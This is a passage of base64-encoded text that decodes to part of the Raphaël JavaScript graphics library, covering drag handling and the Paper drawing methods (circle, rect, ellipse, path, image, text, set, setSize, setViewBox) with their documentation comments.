4gICAgICAgICAgICBpZiAoc3VwcG9ydHNUb3VjaCAmJiBlLnRvdWNoZXMpIHtcbiAgICAgICAgICAgICAgICB2YXIgaSA9IGUudG91Y2hlcy5sZW5ndGgsIHRvdWNoO1xuICAgICAgICAgICAgICAgIHdoaWxlIChpLS0pIHtcbiAgICAgICAgICAgICAgICAgICAgdG91Y2ggPSBlLnRvdWNoZXNbaV07XG4gICAgICAgICAgICAgICAgICAgIHRoaXMuX2RyYWcuaWQgPSB0b3VjaC5pZGVudGlmaWVyO1xuICAgICAgICAgICAgICAgICAgICBpZiAodG91Y2guaWRlbnRpZmllciA9PSB0aGlzLl9kcmFnLmlkKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICB4ID0gdG91Y2guY2xpZW50WDtcbiAgICAgICAgICAgICAgICAgICAgICAgIHkgPSB0b3VjaC5jbGllbnRZO1xuICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICB0aGlzLl9kcmFnLnggPSB4ICsgc2Nyb2xsWDtcbiAgICAgICAgICAgIHRoaXMuX2RyYWcueSA9IHkgKyBzY3JvbGxZO1xuICAgICAgICAgICAgIWRyYWcubGVuZ3RoICYmIFIubW91c2Vtb3ZlKGRyYWdNb3ZlKS5tb3VzZXVwKGRyYWdVcCk7XG4gICAgICAgICAgICBkcmFnLnB1c2goe2VsOiB0aGlzLCBtb3ZlX3Njb3BlOiBtb3ZlX3Njb3BlLCBzdGFydF9zY29wZTogc3RhcnRfc2NvcGUsIGVuZF9zY29wZTogZW5kX3Njb3BlfSk7XG4gICAgICAgICAgICBvbnN0YXJ0ICYmIGV2ZS5vbihcInJhcGhhZWwuZHJhZy5zdGFydC5cIiArIHRoaXMuaWQsIG9uc3RhcnQpO1xuICAgICAgICAgICAgb25tb3ZlICYmIGV2ZS5vbihcInJhcGhhZWwuZHJhZy5tb3ZlLlwiICsgdGhpcy5pZCwgb25tb3ZlKTtcbiAgICAgICAgICAgIG9uZW5kICYmIGV2ZS5vbihcInJhcGhhZWwuZHJhZy5lbmQuXCIgKyB0aGlzLmlkLCBvbmVuZCk7XG4gICAgICAgICAgICBldmUoXCJyYXBoYWVsLmRyYWcuc3RhcnQuXCIgKyB0aGlzLmlkLCBzdGFydF9zY29wZSB8fCBtb3ZlX3Njb3BlIHx8IHRoaXMsIHRoaXMuX2RyYWcueCwgdGhpcy5fZHJhZy55LCBlKTtcbiAgICAgICAgfVxuICAgICAgICB0aGlzLl9kcmFnID0ge307XG4gICAgICAgIGRyYWdnYWJsZS5wdXNoKHtlbDogdGhpcywgc3RhcnQ6IHN0YXJ0fSk7XG4gICAgICAgIHRoaXMubW91c2Vkb3duKHN0YXJ0KTtcbiAgICAgICAgcmV0dXJuIHRoaXM7XG4gICAgfTtcbiAgICAvKlxcXG4gICAgICogRWxlbWVudC5vbkRyYWdPdmVyXG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBTaG9ydGN1dCBmb3IgYXNzaWduaW5nIGV2ZW50IGhhbmRsZXIgZm9yIGBkcmFnLm92ZXIuPGlkPmAgZXZlbnQsIHdoZXJlIGlkIGlzIGlkIG9mIHRoZSBlbGVtZW50IChzZWUgQEVsZW1lbnQuaWQpLlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgLSBmIChmdW5jdGlvbikgaGFuZGxlciBmb3IgZXZlbnQsIGZpcnN0IGFyZ3VtZW50IHdvdWxkIGJlIHRoZSBlbGVtZW50IHlvdSBhcmUgZHJhZ2dpbmcgb3ZlclxuICAgIFxcKi9cbiAgICBlbHByb3RvLm9uRHJhZ092ZXIgPSBmdW5jdGlvbiAoZikge1xuICAgICAgICBmID8gZXZlLm9uKFwicmFwaGFlbC5kcmFnLm92ZXIuXCIgKyB0aGlzLmlkLCBmKSA6IGV2ZS51bmJpbmQoXCJyYXBoYWVsLmRyYWcub3Zlci5cIiArIHRoaXMuaWQpO1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIEVsZW1lbnQudW5kcmFnXG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBSZW1vdmVzIGFsbCBkcmFnIGV2ZW50IGhhbmRsZXJzIGZyb20gZ2l2ZW4gZWxlbWVudC5cbiAgICBcXCovXG4gICAgZWxwcm90by51bmRyYWcgPSBmdW5jdGlvbiAoKSB7XG4gICAgICAgIHZhciBpID0gZHJhZ2dhYmxlLmxlbmd0aDtcbiAgICAgICAgd2hpbGUgKGktLSkgaWYgKGRyYWdnYWJsZVtpXS5lbCA9PSB0aGlzKSB7XG4gICAgICAgICAgICB0aGlzLnVubW91c2Vkb3duKGRyYWdnYWJsZVtpXS5zdGFydCk7XG4gICAgICAgICAgICBkcmFnZ2FibGUuc3BsaWNlKGksIDEpO1xuICAgICAgICAgICAgZXZlLnVuYmluZChcInJhcGhhZWwuZHJhZy4qLlwiICsgdGhpcy5pZCk7XG4gICAgICAgIH1cbiAgICAgICAgIWRyYWdnYWJsZS5sZW5ndGggJiYgUi51bm1vdXNlbW92ZShkcmFnTW92ZSkudW5tb3VzZXVwKGRyYWdVcCk7XG4gICAgICAgIGRyYWcgPSBbXTtcbiAgICB9O1xuICAgIC8qXFxcbiAgICAgKiBQYXBlci5jaXJjbGVcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIERyYXdzIGEgY2lyY2xlLlxuICAgICAqKlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgKipcbiAgICAgLSB4IChudW1iZXIpIHggY29vcmRpbmF0ZSBvZiB0aGUgY2VudHJlXG4gICAgIC0geSAobnVtYmVyKSB5IGNvb3JkaW5hdGUgb2YgdGhlIGNlbnRyZVxuICAgICAtIHIgKG51bWJlcikgcmFkaXVzXG4gICAgID0gKG9iamVjdCkgUmFwaGHDq2wgZWxlbWVudCBvYmplY3Qgd2l0aCB0eXBlIOKAnGNpcmNsZeKAnVxuICAgICAqKlxuICAgICA+IFVzYWdlXG4gICAgIHwgdmFyIGMgPSBwYXBlci5jaXJjbGUoNTAsIDUwLCA0MCk7XG4gICAgXFwqL1xuICAgIHBhcGVycHJvdG8uY2lyY2xlID0gZnVuY3Rpb24gKHgsIHksIHIpIHtcbiAgICAgICAgdmFyIG91dCA9IFIuX2VuZ2luZS5jaXJjbGUodGhpcywgeCB8fCAwLCB5IHx8IDAsIHIgfHwgMCk7XG4gICAgICAgIHRoaXMuX19zZXRfXyAmJiB0aGlzLl9fc2V0X18ucHVzaChvdXQpO1xuICAgICAgICByZXR1cm4gb3V0O1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIFBhcGVyLnJlY3RcbiAgICAgWyBtZXRob2QgXVxuICAgICAqXG4gICAgICogRHJhd3MgYSByZWN0YW5nbGUuXG4gICAgICoqXG4gICAgID4gUGFyYW1ldGVyc1xuICAgICAqKlxuICAgICAtIHggKG51bWJlcikgeCBjb29yZGluYXRlIG9mIHRoZSB0b3AgbGVmdCBjb3JuZXJcbiAgICAgLSB5IChudW1iZXIpIHkgY29vcmRpbmF0ZSBvZiB0aGUgdG9wIGxlZnQgY29ybmVyXG4gICAgIC0gd2lkdGggKG51bWJlcikgd2lkdGhcbiAgICAgLSBoZWlnaHQgKG51bWJlcikgaGVpZ2h0XG4gICAgIC0gciAobnVtYmVyKSAjb3B0aW9uYWwgcmFkaXVzIGZvciByb3VuZGVkIGNvcm5lcnMsIGRlZmF1bHQgaXMgMFxuICAgICA9IChvYmplY3QpIFJhcGhhw6tsIGVsZW1lbnQgb2JqZWN0IHdpdGggdHlwZSDigJxyZWN04oCdXG4gICAgICoqXG4gICAgID4gVXNhZ2VcbiAgICAgfCAvLyByZWd1bGFyIHJlY3RhbmdsZVxuICAgICB8IHZhciBjID0gcGFwZXIucmVjdCgxMCwgMTAsIDUwLCA1MCk7XG4gICAgIHwgLy8gcmVjdGFuZ2xlIHdpdGggcm91bmRlZCBjb3JuZXJzXG4gICAgIHwgdmFyIGMgPSBwYXBlci5yZWN0KDQwLCA0MCwgNTAsIDUwLCAxMCk7XG4gICAgXFwqL1xuICAgIHBhcGVycHJvdG8ucmVjdCA9IGZ1bmN0aW9uICh4LCB5LCB3LCBoLCByKSB7XG4gICAgICAgIHZhciBvdXQgPSBSLl9lbmdpbmUucmVjdCh0aGlzLCB4IHx8IDAsIHkgfHwgMCwgdyB8fCAwLCBoIHx8IDAsIHIgfHwgMCk7XG4gICAgICAgIHRoaXMuX19zZXRfXyAmJiB0aGlzLl9fc2V0X18ucHVzaChvdXQpO1xuICAgICAgICByZXR1cm4gb3V0O1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIFBhcGVyLmVsbGlwc2VcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIERyYXdzIGFuIGVsbGlwc2UuXG4gICAgICoqXG4gICAgID4gUGFyYW1ldGVyc1xuICAgICAqKlxuICAgICAtIHggKG51bWJlcikgeCBjb29yZGluYXRlIG9mIHRoZSBjZW50cmVcbiAgICAgLSB5IChudW1iZXIpIHkgY29vcmRpbmF0ZSBvZiB0aGUgY2VudHJlXG4gICAgIC0gcnggKG51bWJlcikgaG9yaXpvbnRhbCByYWRpdXNcbiAgICAgLSByeSAobnVtYmVyKSB2ZXJ0aWNhbCByYWRpdXNcbiAgICAgPSAob2JqZWN0KSBSYXBoYcOrbCBlbGVtZW50IG9iamVjdCB3aXRoIHR5cGUg4oCcZWxsaXBzZeKAnVxuICAgICAqKlxuICAgICA+IFVzYWdlXG4gICAgIHwgdmFyIGMgPSBwYXBlci5lbGxpcHNlKDUwLCA1MCwgNDAsIDIwKTtcbiAgICBcXCovXG4gICAgcGFwZXJwcm90by5lbGxpcHNlID0gZnVuY3Rpb24gKHgsIHksIHJ4LCByeSkge1xuICAgICAgICB2YXIgb3V0ID0gUi5fZW5naW5lLmVsbGlwc2UodGhpcywgeCB8fCAwLCB5IHx8IDAsIHJ4IHx8IDAsIHJ5IHx8IDApO1xuICAgICAgICB0aGlzLl9fc2V0X18gJiYgdGhpcy5fX3NldF9fLnB1c2gob3V0KTtcbiAgICAgICAgcmV0dXJuIG91dDtcbiAgICB9O1xuICAgIC8qXFxcbiAgICAgKiBQYXBlci5wYXRoXG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBDcmVhdGVzIGEgcGF0aCBlbGVtZW50IGJ5IGdpdmVuIHBhdGggZGF0YSBzdHJpbmcuXG4gICAgID4gUGFyYW1ldGVyc1xuICAgICAtIHBhdGhTdHJpbmcgKHN0cmluZykgI29wdGlvbmFsIHBhdGggc3RyaW5nIGluIFNWRyBmb3JtYXQuXG4gICAgICogUGF0aCBzdHJpbmcgY29uc2lzdHMgb2Ygb25lLWxldHRlciBjb21tYW5kcywgZm9sbG93ZWQgYnkgY29tbWEgc2VwcmFyYXRlZCBhcmd1bWVudHMgaW4gbnVtZXJjYWwgZm9ybS4gRXhhbXBsZTpcbiAgICAgfCBcIk0xMCwyMEwzMCw0MFwiXG4gICAgICogSGVyZSB3ZSBjYW4gc2VlIHR3byBjb21tYW5kczog4oCcTeKAnSwgd2l0aCBhcmd1bWVudHMgYCgxMCwgMjApYCBhbmQg4oCcTOKAnSB3aXRoIGFyZ3VtZW50cyBgKDMwLCA0MClgLiBVcHBlciBjYXNlIGxldHRlciBtZWFuIGNvbW1hbmQgaXMgYWJzb2x1dGUsIGxvd2VyIGNhc2XigJRyZWxhdGl2ZS5cbiAgICAgKlxuICAgICAjIDxwPkhlcmUgaXMgc2hvcnQgbGlzdCBvZiBjb21tYW5kcyBhdmFpbGFibGUsIGZvciBtb3JlIGRldGFpbHMgc2VlIDxhIGhyZWY9XCJodHRwOi8vd3d3LnczLm9yZy9UUi9TVkcvcGF0aHMuaHRtbCNQYXRoRGF0YVwiIHRpdGxlPVwiRGV0YWlscyBvZiBhIHBhdGgncyBkYXRhIGF0dHJpYnV0ZSdzIGZvcm1hdCBhcmUgZGVzY3JpYmVkIGluIHRoZSBTVkcgc3BlY2lmaWNhdGlvbi5cIj5TVkcgcGF0aCBzdHJpbmcgZm9ybWF0PC9hPi48L3A+XG4gICAgICMgPHRhYmxlPjx0aGVhZD48dHI+PHRoPkNvbW1hbmQ8L3RoPjx0aD5OYW1lPC90aD48dGg+UGFyYW1ldGVyczwvdGg+PC90cj48L3RoZWFkPjx0Ym9keT5cbiAgICAgIyA8dHI+PHRkPk08L3RkPjx0ZD5tb3ZldG88L3RkPjx0ZD4oeCB5KSs8L3RkPjwvdHI+XG4gICAgICMgPHRyPjx0ZD5aPC90ZD48dGQ+Y2xvc2VwYXRoPC90ZD48dGQ+KG5vbmUpPC90ZD48L3RyPlxuICAgICAjIDx0cj48dGQ+TDwvdGQ+PHRkPmxpbmV0bzwvdGQ+PHRkPih4IHkpKzwvdGQ+PC90cj5cbiAgICAgIyA8dHI+PHRkPkg8L3RkPjx0ZD5ob3Jpem9udGFsIGxpbmV0bzwvdGQ+PHRkPngrPC90ZD48L3RyPlxuICAgICAjIDx0cj48dGQ+VjwvdGQ+PHRkPnZlcnRpY2FsIGxpbmV0bzwvdGQ+PHRkPnkrPC90ZD48L3RyPlxuICAgICAjIDx0cj48dGQ+QzwvdGQ+PHRkPmN1cnZldG88L3RkPjx0ZD4oeDEgeTEgeDIgeTIgeCB5KSs8L3RkPjwvdHI+XG4gICAgICMgPHRyPjx0ZD5TPC90ZD48dGQ+c21vb3RoIGN1cnZldG88L3RkPjx0ZD4oeDIgeTIgeCB5KSs8L3RkPjwvdHI+XG4gICAgICMgPHRyPjx0ZD5RPC90ZD48dGQ+cXVhZHJhdGljIELDqXppZXIgY3VydmV0bzwvdGQ+PHRkPih4MSB5MSB4IHkpKzwvdGQ+PC90cj5cbiAgICAgIyA8dHI+PHRkPlQ8L3RkPjx0ZD5zbW9vdGggcXVhZHJhdGljIELDqXppZXIgY3VydmV0bzwvdGQ+PHRkPih4IHkpKzwvdGQ+PC90cj5cbiAgICAgIyA8dHI+PHRkPkE8L3RkPjx0ZD5lbGxpcHRpY2FsIGFyYzwvdGQ+PHRkPihyeCByeSB4LWF4aXMtcm90YXRpb24gbGFyZ2UtYXJjLWZsYWcgc3dlZXAtZmxhZyB4IHkpKzwvdGQ+PC90cj5cbiAgICAgIyA8dHI+PHRkPlI8L3RkPjx0ZD48YSBocmVmPVwiaHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9DYXRtdWxs4oCTUm9tX3NwbGluZSNDYXRtdWxsLkUyLjgwLjkzUm9tX3NwbGluZVwiPkNhdG11bGwtUm9tIGN1cnZldG88L2E+KjwvdGQ+PHRkPngxIHkxICh4IHkpKzwvdGQ+PC90cj48L3Rib2R5PjwvdGFibGU+XG4gICAgICogKiDigJxDYXRtdWxsLVJvbSBjdXJ2ZXRv4oCdIGlzIGEgbm90IHN0YW5kYXJkIFNWRyBjb21tYW5kIGFuZCBhZGRlZCBpbiAyLjAgdG8gbWFrZSBsaWZlIGVhc2llci5cbiAgICAgKiBOb3RlOiB0aGVyZSBpcyBhIHNwZWNpYWwgY2FzZSB3aGVuIHBhdGggY29uc2lzdCBvZiBqdXN0IHRocmVlIGNvbW1hbmRzOiDigJxNMTAsMTBS4oCmeuKAnS4gSW4gdGhpcyBjYXNlIHBhdGggd2lsbCBzbW9vdGhseSBjb25uZWN0cyB0byBpdHMgYmVnaW5uaW5nLlxuICAgICA+IFVzYWdlXG4gICAgIHwgdmFyIGMgPSBwYXBlci5wYXRoKFwiTTEwIDEwTDkwIDkwXCIpO1xuICAgICB8IC8vIGRyYXcgYSBkaWFnb25hbCBsaW5lOlxuICAgICB8IC8vIG1vdmUgdG8gMTAsMTAsIGxpbmUgdG8gOTAsOTBcbiAgICAgKiBGb3IgZXhhbXBsZSBvZiBwYXRoIHN0cmluZ3MsIGNoZWNrIG91dCB0aGVzZSBpY29uczogaHR0cDovL3JhcGhhZWxqcy5jb20vaWNvbnMvXG4gICAgXFwqL1xuICAgIHBhcGVycHJvdG8ucGF0aCA9IGZ1bmN0aW9uIChwYXRoU3RyaW5nKSB7XG4gICAgICAgIHBhdGhTdHJpbmcgJiYgIVIuaXMocGF0aFN0cmluZywgc3RyaW5nKSAmJiAhUi5pcyhwYXRoU3RyaW5nWzBdLCBhcnJheSkgJiYgKHBhdGhTdHJpbmcgKz0gRSk7XG4gICAgICAgIHZhciBvdXQgPSBSLl9lbmdpbmUucGF0aChSLmZvcm1hdFthcHBseV0oUiwgYXJndW1lbnRzKSwgdGhpcyk7XG4gICAgICAgIHRoaXMuX19zZXRfXyAmJiB0aGlzLl9fc2V0X18ucHVzaChvdXQpO1xuICAgICAgICByZXR1cm4gb3V0O1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIFBhcGVyLmltYWdlXG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBFbWJlZHMgYW4gaW1hZ2UgaW50byB0aGUgc3VyZmFjZS5cbiAgICAgKipcbiAgICAgPiBQYXJhbWV0ZXJzXG4gICAgICoqXG4gICAgIC0gc3JjIChzdHJpbmcpIFVSSSBvZiB0aGUgc291cmNlIGltYWdlXG4gICAgIC0geCAobnVtYmVyKSB4IGNvb3JkaW5hdGUgcG9zaXRpb25cbiAgICAgLSB5IChudW1iZXIpIHkgY29vcmRpbmF0ZSBwb3NpdGlvblxuICAgICAtIHdpZHRoIChudW1iZXIpIHdpZHRoIG9mIHRoZSBpbWFnZVxuICAgICAtIGhlaWdodCAobnVtYmVyKSBoZWlnaHQgb2YgdGhlIGltYWdlXG4gICAgID0gKG9iamVjdCkgUmFwaGHDq2wgZWxlbWVudCBvYmplY3Qgd2l0aCB0eXBlIOKAnGltYWdl4oCdXG4gICAgICoqXG4gICAgID4gVXNhZ2VcbiAgICAgfCB2YXIgYyA9IHBhcGVyLmltYWdlKFwiYXBwbGUucG5nXCIsIDEwLCAxMCwgODAsIDgwKTtcbiAgICBcXCovXG4gICAgcGFwZXJwcm90by5pbWFnZSA9IGZ1bmN0aW9uIChzcmMsIHgsIHksIHcsIGgpIHtcbiAgICAgICAgdmFyIG91dCA9IFIuX2VuZ2luZS5pbWFnZSh0aGlzLCBzcmMgfHwgXCJhYm91dDpibGFua1wiLCB4IHx8IDAsIHkgfHwgMCwgdyB8fCAwLCBoIHx8IDApO1xuICAgICAgICB0aGlzLl9fc2V0X18gJiYgdGhpcy5fX3NldF9fLnB1c2gob3V0KTtcbiAgICAgICAgcmV0dXJuIG91dDtcbiAgICB9O1xuICAgIC8qXFxcbiAgICAgKiBQYXBlci50ZXh0XG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBEcmF3cyBhIHRleHQgc3RyaW5nLiBJZiB5b3UgbmVlZCBsaW5lIGJyZWFrcywgcHV0IOKAnFxcbuKAnSBpbiB0aGUgc3RyaW5nLlxuICAgICAqKlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgKipcbiAgICAgLSB4IChudW1iZXIpIHggY29vcmRpbmF0ZSBwb3NpdGlvblxuICAgICAtIHkgKG51bWJlcikgeSBjb29yZGluYXRlIHBvc2l0aW9uXG4gICAgIC0gdGV4dCAoc3RyaW5nKSBUaGUgdGV4dCBzdHJpbmcgdG8gZHJhd1xuICAgICA9IChvYmplY3QpIFJhcGhhw6tsIGVsZW1lbnQgb2JqZWN0IHdpdGggdHlwZSDigJx0ZXh04oCdXG4gICAgICoqXG4gICAgID4gVXNhZ2VcbiAgICAgfCB2YXIgdCA9IHBhcGVyLnRleHQoNTAsIDUwLCBcIlJhcGhhw6tsXFxua2lja3NcXG5idXR0IVwiKTtcbiAgICBcXCovXG4gICAgcGFwZXJwcm90by50ZXh0ID0gZnVuY3Rpb24gKHgsIHksIHRleHQpIHtcbiAgICAgICAgdmFyIG91dCA9IFIuX2VuZ2luZS50ZXh0KHRoaXMsIHggfHwgMCwgeSB8fCAwLCBTdHIodGV4dCkpO1xuICAgICAgICB0aGlzLl9fc2V0X18gJiYgdGhpcy5fX3NldF9fLnB1c2gob3V0KTtcbiAgICAgICAgcmV0dXJuIG91dDtcbiAgICB9O1xuICAgIC8qXFxcbiAgICAgKiBQYXBlci5zZXRcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIENyZWF0ZXMgYXJyYXktbGlrZSBvYmplY3QgdG8ga2VlcCBhbmQgb3BlcmF0ZSBzZXZlcmFsIGVsZW1lbnRzIGF0IG9uY2UuXG4gICAgICogV2FybmluZzogaXQgZG9lc27igJl0IGNyZWF0ZSBhbnkgZWxlbWVudHMgZm9yIGl0c2VsZiBpbiB0aGUgcGFnZSwgaXQganVzdCBncm91cHMgZXhpc3RpbmcgZWxlbWVudHMuXG4gICAgICogU2V0cyBhY3QgYXMgcHNldWRvIGVsZW1lbnRzIOKAlCBhbGwgbWV0aG9kcyBhdmFpbGFibGUgdG8gYW4gZWxlbWVudCBjYW4gYmUgdXNlZCBvbiBhIHNldC5cbiAgICAgPSAob2JqZWN0KSBhcnJheS1saWtlIG9iamVjdCB0aGF0IHJlcHJlc2VudHMgc2V0IG9mIGVsZW1lbnRzXG4gICAgICoqXG4gICAgID4gVXNhZ2VcbiAgICAgfCB2YXIgc3QgPSBwYXBlci5zZXQoKTtcbiAgICAgfCBzdC5wdXNoKFxuICAgICB8ICAgICBwYXBlci5jaXJjbGUoMTAsIDEwLCA1KSxcbiAgICAgfCAgICAgcGFwZXIuY2lyY2xlKDMwLCAxMCwgNSlcbiAgICAgfCApO1xuICAgICB8IHN0LmF0dHIoe2ZpbGw6IFwicmVkXCJ9KTsgLy8gY2hhbmdlcyB0aGUgZmlsbCBvZiBib3RoIGNpcmNsZXNcbiAgICBcXCovXG4gICAgcGFwZXJwcm90by5zZXQgPSBmdW5jdGlvbiAoaXRlbXNBcnJheSkge1xuICAgICAgICAhUi5pcyhpdGVtc0FycmF5LCBcImFycmF5XCIpICYmIChpdGVtc0FycmF5ID0gQXJyYXkucHJvdG90eXBlLnNwbGljZS5jYWxsKGFyZ3VtZW50cywgMCwgYXJndW1lbnRzLmxlbmd0aCkpO1xuICAgICAgICB2YXIgb3V0ID0gbmV3IFNldChpdGVtc0FycmF5KTtcbiAgICAgICAgdGhpcy5fX3NldF9fICYmIHRoaXMuX19zZXRfXy5wdXNoKG91dCk7XG4gICAgICAgIG91dFtcInBhcGVyXCJdID0gdGhpcztcbiAgICAgICAgb3V0W1widHlwZVwiXSA9IFwic2V0XCI7XG4gICAgICAgIHJldHVybiBvdXQ7XG4gICAgfTtcbiAgICAvKlxcXG4gICAgICogUGFwZXIuc2V0U3RhcnRcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIENyZWF0ZXMgQFBhcGVyLnNldC4gQWxsIGVsZW1lbnRzIHRoYXQgd2lsbCBiZSBjcmVhdGVkIGFmdGVyIGNhbGxpbmcgdGhpcyBtZXRob2QgYW5kIGJlZm9yZSBjYWxsaW5nXG4gICAgICogQFBhcGVyLnNldEZpbmlzaCB3aWxsIGJlIGFkZGVkIHRvIHRoZSBzZXQuXG4gICAgICoqXG4gICAgID4gVXNhZ2VcbiAgICAgfCBwYXBlci5zZXRTdGFydCgpO1xuICAgICB8IHBhcGVyLmNpcmNsZSgxMCwgMTAsIDUpLFxuICAgICB8IHBhcGVyLmNpcmNsZSgzMCwgMTAsIDUpXG4gICAgIHwgdmFyIHN0ID0gcGFwZXIuc2V0RmluaXNoKCk7XG4gICAgIHwgc3QuYXR0cih7ZmlsbDogXCJyZWRcIn0pOyAvLyBjaGFuZ2VzIHRoZSBmaWxsIG9mIGJvdGggY2lyY2xlc1xuICAgIFxcKi9cbiAgICBwYXBlcnByb3RvLnNldFN0YXJ0ID0gZnVuY3Rpb24gKHNldCkge1xuICAgICAgICB0aGlzLl9fc2V0X18gPSBzZXQgfHwgdGhpcy5zZXQoKTtcbiAgICB9O1xuICAgIC8qXFxcbiAgICAgKiBQYXBlci5zZXRGaW5pc2hcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIFNlZSBAUGFwZXIuc2V0U3RhcnQuIFRoaXMgbWV0aG9kIGZpbmlzaGVzIGNhdGNoaW5nIGFuZCByZXR1cm5zIHJlc3VsdGluZyBzZXQuXG4gICAgICoqXG4gICAgID0gKG9iamVjdCkgc2V0XG4gICAgXFwqL1xuICAgIHBhcGVycHJvdG8uc2V0RmluaXNoID0gZnVuY3Rpb24gKHNldCkge1xuICAgICAgICB2YXIgb3V0ID0gdGhpcy5fX3NldF9fO1xuICAgICAgICBkZWxldGUgdGhpcy5fX3NldF9fO1xuICAgICAgICByZXR1cm4gb3V0O1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIFBhcGVyLmdldFNpemVcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIE9idGFpbnMgY3VycmVudCBwYXBlciBhY3R1YWwgc2l6ZS5cbiAgICAgKipcbiAgICAgPSAob2JqZWN0KVxuICAgICBcXCovXG4gICAgcGFwZXJwcm90by5nZXRTaXplID0gZnVuY3Rpb24gKCkge1xuICAgICAgICB2YXIgY29udGFpbmVyID0gdGhpcy5jYW52YXMucGFyZW50Tm9kZTtcbiAgICAgICAgcmV0dXJuIHtcbiAgICAgICAgICAgIHdpZHRoOiBjb250YWluZXIub2Zmc2V0V2lkdGgsXG4gICAgICAgICAgICBoZWlnaHQ6IGNvbnRhaW5lci5vZmZzZXRIZWlnaHRcbiAgICAgICAgICAgICAgICB9O1xuICAgICAgICB9O1xuICAgIC8qXFxcbiAgICAgKiBQYXBlci5zZXRTaXplXG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBJZiB5b3UgbmVlZCB0byBjaGFuZ2UgZGltZW5zaW9ucyBvZiB0aGUgY2FudmFzIGNhbGwgdGhpcyBtZXRob2RcbiAgICAgKipcbiAgICAgPiBQYXJhbWV0ZXJzXG4gICAgICoqXG4gICAgIC0gd2lkdGggKG51bWJlcikgbmV3IHdpZHRoIG9mIHRoZSBjYW52YXNcbiAgICAgLSBoZWlnaHQgKG51bWJlcikgbmV3IGhlaWdodCBvZiB0aGUgY2FudmFzXG4gICAgXFwqL1xuICAgIHBhcGVycHJvdG8uc2V0U2l6ZSA9IGZ1bmN0aW9uICh3aWR0aCwgaGVpZ2h0KSB7XG4gICAgICAgIHJldHVybiBSLl9lbmdpbmUuc2V0U2l6ZS5jYWxsKHRoaXMsIHdpZHRoLCBoZWlnaHQpO1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIFBhcGVyLnNldFZpZXdCb3hcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIFNldHMgdGhlIHZpZXcgYm94IG9mIHRoZSBwYXBlci4gUHJhY3RpY2FsbHkgaXQgZ2l2ZXMgeW91IGFiaWxpdHkgdG8gem9vbSBhbmQgcGFuIHdob2xlIHBhcGVyIHN1cmZhY2UgYnlcbiAgICAgKiBzcGVjaWZ5aW5nIG5ldyBib3VuZGFyaWVzLlxuICAgICAqKlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgKipcbiAgICAgLSB4IChudW1iZXIpIG5ldyB4IHBvc2l0aW9uLCBkZWZhdWx0IGlzIGAwYFxuICAgICAtIHkgKG51bWJlcikgbmV3IHkgcG9zaXRpb24sIGRlZmF1bHQgaXMgYDBgXG4gICAgIC0gdyAobnVtYmVyKSBuZXcgd2lkdGggb2YgdGhlIGNhbnZhc1xuICAgICAtIGggKG51bWJlcikgbmV3IGhlaWdodCBvZiB0aGUgY2FudmFzXG4gICAgIC0gZml0IChib29sZWFuKSBgdHJ1ZWAgaWYgeW91IHdhbnQgZ3JhcGhpY3MgdG8gZml0IGludG8gbmV3IGJvdW5kYXJ5IGJveFxuICAgIFxcKi9cbiAgICBwYXBlcnByb3RvLnNldFZpZXdCb3ggPSBmdW5jdGlvbiAoeCwgeSwgdywgaCwgZml0KSB7XG4gICAgICAgIHJldHVybiBSLl9lbmdpbmUuc2V0Vmlld0JveC5jYWxsKHRoaXMsIHgsIHksIHcsIGgsIGZpdCk7XG4gICAgfTtcbiAgICAvKlxcXG4gICAgICogUGFwZXIudG9wXG4gICAgIFsgcHJvcGVydHkgXVxuICAgICAqKlxuICAgICAqIFBvaW50cyB0byB0aGUgdG9wbW9zdCBlbGVtZW50IG9uIHRoZSBwYXBlclxuICAgIFxcKi9cbiAgICAvKlxcXG4gICAgICogUGFwZXIuYm90dG9tXG4gICAgIFsgcHJvcGVydHkgXVxuICAgICAqKlxuICAgICAqIFBvaW50cyB0byB0aGUgYm90dG9tIGVsZW1lbnQgb24gdGhlIHBhcGVyXG4gICAgXFwqL1xuICAgIHBhcGVycHJvdG8udG9wID0gcGFwZXJwcm90by5ib3R0b20gPSBudWxsO1xuICAgIC8qXFxcbiAgICAgKiBQYXBlci5yYXBoYWVsXG4gICAgIFsgcHJvcGVydHkgXVxuICAgICAqKlxuICAgICAqIFBvaW50cyB0byB0aGUgQFJhcGhhZWwgb2JqZWN0L2Z1bmN0aW9uXG4gICAgXFwqL1xuICAgIHBhcGVycHJvdG8ucmFwaGFlbCA9IFI7XG4gICAgdmFyIGdldE9mZnNldCA9IGZ1bmN0aW9uIChlbGVtKSB7XG4gICAgICAgIHZhciBib3ggPSBlbGVtLmdldEJvdW5kaW5nQ2xpZW50UmVjdCgpLFxuICAgICAgICAgICAgZG9jID0gZWxlbS5vd25lckRvY3VtZW50LFxuICAgICAgICAgICAgYm9keSA9IGRvYy5ib2R5LFxuICAgICAgICAgICAgZG9jRWxlbSA9IGRvYy5kb2N1bWVudEVsZW1lbnQsXG4gICAg